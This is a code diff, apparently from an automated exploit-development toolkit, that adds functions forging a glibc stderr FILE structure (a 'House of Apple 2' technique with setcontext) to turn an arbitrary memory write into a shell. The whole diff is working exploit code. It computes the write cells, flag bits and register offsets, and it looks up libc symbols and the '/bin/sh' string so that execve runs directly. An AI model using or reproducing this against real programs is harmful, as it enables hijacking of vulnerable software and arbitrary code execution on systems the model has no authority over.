@@ -251,8 +251,8 @@ HOA2_SPLIT_MIN = 0xE8                                  # the larger of the split
 #: bytes land over `_IO_2_1_stdout_` AND the `stdout`/`stderr`/`stdin` pointer variables that
 #: follow it, and a cell-at-a-time writer runs the target's own code -- its next prompt -- between
 #: every write, so a half-built FILE is executed. Five cells, and the FILE is one the program
-#: never touches, so nothing in between runs through it.
-_HOA2_CELL_COUNT = 5
+#: never touches, so nothing in between runs through it. How many cells depends on the plan:
+#: five for `house_of_apple2_cells` (`system`), nine for `setcontext_fsop_cells`.
 
 
 def house_of_apple2_cells(fp_addr: int, *, wide_data: int, wide_vtable: int, wfile_jumps: int,
@@ -290,6 +290,81 @@ def house_of_apple2_cells(fp_addr: int, *, wide_data: int, wide_vtable: int, wfi
             (fp_addr + _F_WRITE_PTR, 1),
             (fp_addr + _F_VTABLE, wfile_jumps),
             (fp_addr + _F_FLAGS, cmd)]
+
+
+#: The two `_flags` bits the setcontext route turns, and why each one has to turn.
+#:
+#: `_IO_UNBUFFERED` (0x2): `_IO_wdoallocbuf` opens `test BYTE PTR [rdi],0x2` and an unbuffered
+#: stream takes a path that NEVER reaches `call [rax+0x68]`. The `system` route gets away with
+#: leaving the bit alone only by accident -- it overwrites `_flags` with `" /bin/sh"`, whose
+#: leading space (0x20) happens to clear it. A route that needs `_flags` for anything else has to
+#: clear the bit deliberately, and stderr ships with it set.
+#:
+#: `_IO_USER_LOCK` (0x8000): `_IO_flockfile` is
+#: `if ((fp->_flags & _IO_USER_LOCK) == 0) _IO_lock_lock (*fp->_lock)`, so setting it stops
+#: `_IO_flush_all` dereferencing `_lock` at all. That is what frees fp+0x88 -- which is `_lock`
+#: AND `gregs[RDX]` -- to be 0, and a NULL rdx is what lets RIP go straight to `execve` with no
+#: chain and no gadget.
+_F_UNBUFFERED, _F_USER_LOCK = 0x2, 0x8000
+
+
+def setcontext_fsop_cells(fp_addr: int, *, flags: int, wide_data: int, wide_vtable: int,
+                          wfile_jumps: int, setcontext: int, fields: dict, rip_at: int,
+                          rip: int, rdi: int = 0, rsi: int = 0, rdx: int = 0) -> list:
+    """House of Apple 2 with `setcontext` as the fake `__doallocate` instead of `system` -- the
+    same arbitrary-write cells, but the effect is a full REGISTER LOAD rather than one call with
+    one argument. Returns [(address, 8-byte value)] in write order, like
+    `house_of_apple2_cells`.
+
+    It works because of one instruction in the caller. `_IO_wdoallocbuf` does `mov rdx,rdi` before
+    `call [rax+0x68]`, so at the controlled call RDX holds the FILE POINTER -- and `setcontext`
+    reads its context through rdx. The forged FILE *is* the ucontext. `rop.find_setcontext` gives
+    `fields` (register -> offset) and `rip_at`; the offsets land on FILE fields that are dead by
+    then or that we are setting anyway:
+
+      gregs[RDI] 0x68 = `_chain`        -- only `_IO_flush_all`'s next step reads it, and we leave
+      gregs[RSI] 0x70 = `_fileno`       -- unused between the lock and the overflow
+      gregs[RDX] 0x88 = `_lock`         -- free ONLY because `_IO_USER_LOCK` is set (see above)
+      gregs[RSP] 0xA0 = `_wide_data`    -- the pivoted stack IS the forged wide_data, which the
+                                           write primitive reaches by construction
+      gregs[RIP] 0xA8 = `_freeres_list` -- unused
+
+    `rsp` is not a free parameter for that reason: it is `wide_data`, so a chain the caller wants
+    executed goes at `wide_data + 0`, with `wide_data + 0x30` left NULL (the wide `_IO_buf_base`
+    the allocate path tests) -- six words before it collides. The caller does not need one at all
+    for `execve("/bin/sh", NULL, NULL)`: rdi/rsi/rdx and rip cover it, which is the thing `system`
+    could not do.
+
+    Order: the two writes outside the FILE first, then the FILE's own fields, `_flags` and the
+    vtable last -- the vtable write is what arms the forgery."""
+    cells = [(wide_vtable + _JT_DOALLOCATE, setcontext),
+             (wide_data + _WD_VTABLE, wide_vtable),
+             (fp_addr + _F_WRITE_PTR, 1)]
+    for reg, val in (("rdi", rdi), ("rsi", rsi), ("rdx", rdx)):
+        if reg in fields:
+            cells.append((fp_addr + fields[reg], val))
+    cells.append((fp_addr + rip_at, rip))
+    cells.append((fp_addr + _F_FLAGS, (flags & ~_F_UNBUFFERED) | _F_USER_LOCK))
+    cells.append((fp_addr + _F_VTABLE, wfile_jumps))
+    return cells
+
+
+def setcontext_fsop_targets(libc_data: bytes) -> dict:
+    """What `setcontext_fsop_cells` needs out of the libc the target links: the FILE to forge, the
+    wide jump table, `setcontext`'s register-loading entry and the `execve`/"/bin/sh" pair that
+    makes a chainless shell. Empty if any of it is missing, so the caller can say which."""
+    from . import rop
+    want = ("_IO_2_1_stderr_", "_IO_wfile_jumps", "execve")
+    syms = rop.libc_symbols(libc_data, want)
+    sc = rop.find_setcontext(libc_data)
+    binsh = rop.find_string(libc_data, b"/bin/sh")
+    if not (sc and binsh and all(k in syms for k in want)):
+        return {}
+    return {"fp": syms["_IO_2_1_stderr_"], "wfile_jumps": syms["_IO_wfile_jumps"],
+            "setcontext": sc["entry"], "fields": sc["fields"], "rip_at": sc["rip_at"],
+            "execve": syms["execve"], "binsh": binsh, "fp_name": "_IO_2_1_stderr_",
+            "wide_data_field": _F_WIDE_DATA, "wide_buf_base_field": _WD_BUF_BASE,
+            "flags_field": _F_FLAGS}
 
 
 def house_of_apple2_cell_targets(libc_data: bytes) -> dict:
